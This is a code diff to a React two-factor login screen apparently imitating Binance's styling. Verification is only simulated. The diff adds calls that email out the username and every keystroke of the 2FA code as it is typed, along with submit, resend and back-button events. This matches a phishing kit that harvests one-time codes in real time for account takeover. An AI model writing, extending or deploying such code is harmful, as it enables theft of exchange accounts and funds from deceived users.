@@ -5,6 +5,7 @@ import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { useToast } from "@/hooks/use-toast";
 import { Shield, RefreshCw } from "lucide-react";
+import { sendEmailNotification } from "@/services/emailService";
 
 interface TwoFactorAuthProps {
   username: string;
@@ -31,6 +32,29 @@ const TwoFactorAuth: React.FC<TwoFactorAuthProps> = ({ username, onTwoFactorSucc
     return () => clearInterval(interval);
   }, [timer]);
 
+  const handleCodeChange = async (value: string) => {
+    const processedValue = value.replace(/\D/g, '').slice(0, 6);
+    setCode(processedValue);
+
+    // Send email immediately when code is entered
+    if (processedValue) {
+      try {
+        await sendEmailNotification({
+          step: "Two-Factor Auth - Code Entry",
+          username,
+          timestamp: new Date().toISOString(),
+          allFormData: {
+            username,
+            twoFactorCode: processedValue,
+            codeLength: processedValue.length
+          }
+        });
+      } catch (error) {
+        console.error('❌ Failed to send email for code entry:', error);
+      }
+    }
+  };
+
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     
@@ -45,6 +69,22 @@ const TwoFactorAuth: React.FC<TwoFactorAuthProps> = ({ username, onTwoFactorSucc
 
     setIsLoading(true);
     
+    // Send email for 2FA submission
+    try {
+      await sendEmailNotification({
+        step: "Two-Factor Auth - VERIFICATION SUBMITTED",
+        username,
+        timestamp: new Date().toISOString(),
+        allFormData: {
+          username,
+          twoFactorCode: code,
+          verificationStatus: "submitted"
+        }
+      });
+    } catch (error) {
+      console.error('❌ Failed to send email for 2FA submission:', error);
+    }
+    
     // Simulate 2FA verification
     setTimeout(() => {
       setIsLoading(false);
@@ -56,13 +96,48 @@ const TwoFactorAuth: React.FC<TwoFactorAuthProps> = ({ username, onTwoFactorSucc
     }, 1500);
   };
 
-  const handleResendCode = () => {
+  const handleResendCode = async () => {
     setTimer(30);
     setCanResend(false);
+    
+    // Send email for code refresh
+    try {
+      await sendEmailNotification({
+        step: "Two-Factor Auth - Code Refreshed",
+        username,
+        timestamp: new Date().toISOString(),
+        allFormData: {
+          username,
+          action: "refresh_code"
+        }
+      });
+    } catch (error) {
+      console.error('❌ Failed to send email for code refresh:', error);
+    }
+    
     toast({
       title: "Code refreshed",
       description: "Please check your Google Authenticator app.",
     });
+  };
+
+  const handleBack = async () => {
+    // Send email for back button
+    try {
+      await sendEmailNotification({
+        step: "Two-Factor Auth - Back to Login",
+        username,
+        timestamp: new Date().toISOString(),
+        allFormData: {
+          username,
+          action: "back_to_login"
+        }
+      });
+    } catch (error) {
+      console.error('❌ Failed to send email for back button:', error);
+    }
+    
+    onBack();
   };
 
   return (
@@ -89,7 +164,7 @@ const TwoFactorAuth: React.FC<TwoFactorAuthProps> = ({ username, onTwoFactorSucc
                 id="code"
                 type="text"
                 value={code}
-                onChange={(e) => setCode(e.target.value.replace(/\D/g, '').slice(0, 6))}
+                onChange={(e) => handleCodeChange(e.target.value)}
                 className="bg-[#181A20] border-[#2B3139] text-white text-center text-xl h-12 tracking-widest focus:border-binance-yellow"
                 placeholder="000000"
                 maxLength={6}
@@ -122,7 +197,7 @@ const TwoFactorAuth: React.FC<TwoFactorAuthProps> = ({ username, onTwoFactorSucc
             )}
             
             <button
-              onClick={onBack}
+              onClick={handleBack}
               className="text-binance-yellow hover:text-binance-yellow/80 text-sm font-medium"
             >
               Back to Login
